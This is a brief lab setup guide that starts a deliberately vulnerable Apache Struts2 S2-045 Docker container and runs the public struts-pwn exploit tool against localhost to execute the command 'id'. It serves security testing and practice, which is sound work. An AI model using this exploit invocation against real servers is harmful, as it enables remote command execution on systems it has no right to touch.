Create a .env with
```
IP=YOUR_IP
PORT=YOUR_PORT
```

```
git clone https://github.com/Medicean/VulApps.git
cd VulApps/s/struts2/s2-045
docker pull medicean/vulapps:s_struts2_s2-045
docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-045
```

```
git clone https://github.com/mazen160/struts-pwn
cd struts-pwn
python struts-pwn.py --exploit --url http://localhost:8080/ --cmd "id"
```
